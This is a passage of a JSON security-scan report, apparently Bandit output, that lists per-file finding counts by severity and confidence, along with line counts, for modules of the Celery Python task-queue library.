\"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 89,\n      \"nosec\": 0\n    },\n    \"celery/backends/mongodb.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 243,\n      \"nosec\": 0\n    },\n    \"celery/backends/redis.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 499,\n      \"nosec\": 0\n    },\n    \"celery/backends/rpc.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 251,\n      \"nosec\": 0\n    },\n    \"celery/backends/s3.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 66,\n      \"nosec\": 0\n    },\n    \"celery/beat.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 567,\n      \"nosec\": 0\n    },\n    \"celery/bin/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 0,\n      \"nosec\": 0\n    },\n    \"celery/bin/amqp.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 274,\n      \"nosec\": 0\n    },\n    \"celery/bin/base.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 219,\n      \"nosec\": 0\n    },\n    \"celery/bin/beat.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 63,\n      \"nosec\": 0\n    },\n    \"celery/bin/call.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 69,\n      \"nosec\": 0\n    },\n    \"celery/bin/celery.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 176,\n      \"nosec\": 0\n    },\n    \"celery/bin/control.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 181,\n      \"nosec\": 0\n    },\n    \"celery/bin/events.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 79,\n      \"nosec\": 0\n    },\n    \"celery/bin/graph.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 162,\n      \"nosec\": 0\n    },\n    \"celery/bin/list.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 28,\n      \"nosec\": 0\n    },\n    \"celery/bin/logtool.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 125,\n      \"nosec\": 0\n    },\n    \"celery/bin/migrate.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 57,\n      \"nosec\": 0\n    },\n    \"celery/bin/multi.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 375,\n      \"nosec\": 0\n    },\n    \"celery/bin/purge.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 60,\n      \"nosec\": 0\n    },\n    \"celery/bin/result.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 25,\n      \"nosec\": 0\n    },\n    \"celery/bin/shell.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 144,\n      \"nosec\": 0\n    },\n    \"celery/bin/upgrade.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 74,\n      \"nosec\": 0\n    },\n    \"celery/bin/worker.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 1.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 306,\n      \"nosec\": 0\n    },\n    \"celery/bootsteps.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 308,\n      \"nosec\": 0\n    },\n    \"celery/canvas.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 1143,\n      \"nosec\": 0\n    },\n    \"celery/concurrency/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 22,\n      \"nosec\": 0\n    },\n    \"celery/concurrency/asynpool.py\": {\n      \"CONFIDENCE.HIGH\": 17.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 17.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 1019,\n      \"nosec\": 0\n    },\n    \"celery/concurrency/base.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 128,\n      \"nosec\": 0\n    },\n    \"celery/concurrency/eventlet.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 145,\n      \"nosec\": 0\n    },\n    \"celery/concurrency/gevent.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 93,\n      \"nosec\": 0\n    },\n    \"celery/concurrency/prefork.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 132,\n      \"nosec\": 0\n    },\n    \"celery/concurrency/solo.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 21,\n      \"nosec\": 0\n    },\n    \"celery/concurrency/thread.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 30,\n      \"nosec\": 0\n    },\n    \"celery/contrib/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 0,\n      \"nosec\": 0\n    },\n    \"celery/contrib/abortable.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 114,\n      \"nosec\": 0\n    },\n    \"celery/contrib/migrate.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 323,\n      \"nosec\": 0\n    },\n    \"celery/contrib/pytest.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 153,\n      \"nosec\": 0\n    },\n    \"celery/contrib/rdb.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 142,\n      \"nosec\": 0\n    },\n    \"celery/contrib/sphinx.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 69,\n      \"nosec\": 0\n    },\n    \"celery/contrib/testing/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 0,\n      \"nosec\": 0\n    },\n    \"celery/contrib/testing/app.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 84,\n      \"nosec\": 0\n    },\n    \"celery/contrib/testing/manager.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 176,\n      \"nosec\": 0\n    },\n    \"celery/contrib/testing/mocks.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 101,\n      \"nosec\": 0\n    },\n    \"celery/contrib/testing/tasks.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 6,\n      \"nosec\": 0\n    },\n    \"celery/contrib/testing/worker.py\": {\n      \"CONFIDENCE.HIGH\": 2.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 2.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 141,\n      \"nosec\": 0\n    },\n    \"celery/events/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 12,\n      \"nosec\": 0\n    },\n    \"celery/events/cursesmon.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 446,\n      \"nosec\": 0\n    },\n    \"celery/events/dispatcher.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 194,\n      \"nosec\": 0\n    },\n    \"celery/events/dumper.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 82,\n      \"nosec\": 0\n    },\n    \"celery/events/event.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 45,\n      \"nosec\": 0\n    },\n    \"celery/events/receiver.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 112,\n      \"nosec\": 0\n    },\n    \"celery/events/snapshot.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 88,\n      \"nosec\": 0\n    },\n    \"celery/events/state.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 570,\n      \"nosec\": 0\n    },\n    \"celery/exceptions.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 196,\n      \"nosec\": 0\n    },\n    \"celery/fixups/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 1,\n      \"nosec\": 0\n    },\n    \"celery/fixups/django.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 146,\n      \"nosec\": 0\n    },\n    \"celery/loaders/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 13,\n      \"nosec\": 0\n    },\n    \"celery/loaders/app.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 5,\n      \"nosec\": 0\n    },\n    \"celery/loaders/base.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 204,\n      \"nosec\": 0\n    },\n    \"celery/loaders/default.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 31,\n      \"nosec\": 0\n    },\n    \"celery/local.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      